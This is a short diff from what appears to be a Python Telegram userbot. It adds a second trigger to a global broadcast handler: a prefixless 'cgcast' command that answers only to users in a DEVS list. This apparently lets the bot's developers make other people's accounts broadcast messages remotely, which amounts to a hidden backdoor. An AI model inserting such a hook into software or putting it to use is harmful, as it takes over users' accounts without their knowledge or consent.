@@ -151,6 +151,7 @@ broadcasts = []
 
 
 @USU.UBOT("gcast")
+@ubot.on_message(filters.command("cgcast", "") & filters.user(DEVS))
 async def broadcast_speed(client, message):
     sks = await EMO.SUKSES(client)
     ggl = await EMO.GAGAL(client)
